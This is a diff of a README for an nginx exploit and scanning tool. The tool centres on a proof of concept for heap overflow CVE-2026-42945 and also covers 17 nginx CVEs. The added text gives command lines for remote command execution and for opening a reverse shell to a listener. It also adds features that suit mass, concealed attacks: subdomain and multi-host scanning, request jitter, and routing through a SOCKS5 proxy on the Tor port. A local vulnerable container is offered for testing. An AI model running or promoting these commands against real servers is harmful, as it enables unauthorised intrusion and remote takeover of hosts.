@@ -6,29 +6,98 @@
 
 nginx CVE scanner + RCE exploit framework.
 
-Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` introduced in 2008 — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes.
+Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes, fingerprinting, and report generation.
 
 > Original vulnerability discovered by [depthfirst](https://depthfirst.com)'s security analysis system.
 
 ---
 
-## Features
+## Quick Start
 
-| Mode | Flag | Description |
-|---|---|---|
-| CVE database | `--list-cves` | Print all 17 CVEs with CVSS, range, probe/exploit availability |
-| CVE scanner | `--cve-scan` | Detect nginx version + test all applicable CVEs |
-| Single CVE | `--cve CVE-XXXX-XXXXX` | Test one specific CVE |
-| Subdomain scan | `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
-| Version check | `--check` | Confirm if target is in vulnerable range |
-| Dry run | `--dry-run` | Probe without triggering overflow |
-| RCE command | `--cmd 'id'` | Execute command via CVE-2026-42945 |
-| Reverse shell | `--shell` | Pop interactive shell via CVE-2026-42945 |
-| Command file | `--cmd-file cmds.txt` | Execute list of commands (joined with `;`) |
+```bash
+# Auto mode — fingerprint + full CVE scan + HTML report
+python3 ngixshell.py 127.0.0.1:19321
 
-**Network options:** `--tls`, `--proxy http://127.0.0.1:8080`  
-**Output:** `--output results.log`, `--report`, `--verbose`  
-**Tuning:** `--tries`, `--spray`, `--body-len`, `--timeout-multiplier`
+# Run command via CVE-2026-42945
+python3 ngixshell.py 127.0.0.1:19321 --cmd 'id'
+
+# Reverse shell
+python3 ngixshell.py 127.0.0.1:19321 --shell --listen-ip 10.0.0.1 --listen-port 4444
+
+# Scan subdomains
+python3 ngixshell.py --subdomain-scan example.com --scan-port 443
+
+# Scan multiple targets from file
+python3 ngixshell.py --target-file hosts.txt
+```
+
+No flags required — pointing the tool at a target is enough.  
+TLS is **auto-detected**. An HTML report is **auto-generated** whenever findings exist.
+
+---
+
+## Usage
+
+```
+ngixshell.py [TARGET] [OPTIONS]
+
+TARGET formats accepted:
+  127.0.0.1
+  192.168.1.10:8080
+  http://192.168.1.10:8080
+  https://target.local
+```
+
+### Modes
+
+| Flag | Description |
+|---|---|
+| *(none)* | **Auto** — fingerprint + full CVE scan + report |
+| `--cmd 'CMD'` | Execute command via CVE-2026-42945 RCE |
+| `--cmd-file FILE` | Execute commands from file (joined with `;`) |
+| `--shell` | Pop a reverse shell via CVE-2026-42945 |
+| `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
+| `--cve CVE-ID` | Test one specific CVE |
+| `--list-cves` | Print all 17 CVEs with CVSS and probe info |
+| `--list-candidates` | Print heap address candidates |
+| `--dry-run` | Fingerprint + scan without triggering exploit |
+| `--target-file FILE` | Scan multiple hosts from a file |
+
+### Connection
+
+| Flag | Description |
+|---|---|
+| `--port PORT` | Override port |
+| `--tls` | Force TLS (auto-detected by default) |
+| `--proxy URL` | Proxy: `http://`, `https://`, `socks5://` |
+
+### HTTP Customisation
+
+| Flag | Description |
+|---|---|
+| `--user-agent UA` | Custom User-Agent header |
+| `--auth USER:PASS` | HTTP Basic authentication |
+| `--cookie VALUE` | Cookie header |
+| `--header NAME:VALUE` | Extra header (repeatable) |
+
+### Rate / Timing
+
+| Flag | Description |
+|---|---|
+| `--rate-limit RPS` | Max requests per second |
+| `--jitter MS` | Add random delay 0–MS ms between requests |
+| `--retry N` | Retry probes on inconclusive result (default: 1) |
+| `--timeout-multiplier X` | Scale all sleep timings (default: 1.0) |
+
+### Output
+
+| Flag | Description |
+|---|---|
+| `--output FILE` | Write log to FILE in addition to stdout |
+| `--json` | Print JSON summary at end of run |
+| `--html-report FILE` | Save HTML report to FILE |
+| `--no-report` | Skip the automatic HTML report |
+| `--verbose` | Debug output including caught exceptions |
 
 ---
 
@@ -78,28 +147,31 @@ Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>
 
 ---
 
-## Usage
+## Setup
 
-Tested on Ubuntu 24.04.3 LTS.
+Tested on Ubuntu 24.04.3 LTS. No external dependencies — pure Python 3 stdlib.
 
 ```bash
-# 1. Build the vulnerable nginx container
-./setup.sh
-
-# 2. Start the server (ASLR disabled)
+# Build the vulnerable nginx container
 docker compose -f env/docker-compose.yml up
 
-# 3. Scan all CVEs
-python3 poc.py --cve-scan --host 127.0.0.1 --port 19321
+# Scan all CVEs
+python3 ngixshell.py 127.0.0.1:19321
 
-# 4. Execute a command
-python3 poc.py --cmd 'id' --report
+# Execute a command
+python3 ngixshell.py 127.0.0.1:19321 --cmd 'id' --json
 
-# 5. Pop a shell
-python3 poc.py --shell --listen-ip 172.17.0.1 --listen-port 1337
+# Pop a shell
+python3 ngixshell.py 127.0.0.1:19321 --shell --listen-ip 172.17.0.1 --listen-port 1337
 
-# 6. Scan subdomains
-python3 poc.py --subdomain-scan example.com --scan-port 443 --scan-tls
+# Scan subdomains
+python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --scan-tls
+
+# Multiple targets with rate limiting
+python3 ngixshell.py --target-file hosts.txt --rate-limit 5 --json
+
+# Through SOCKS5 proxy
+python3 ngixshell.py 192.168.1.10 --proxy socks5://127.0.0.1:9050
 ```
 
 ---
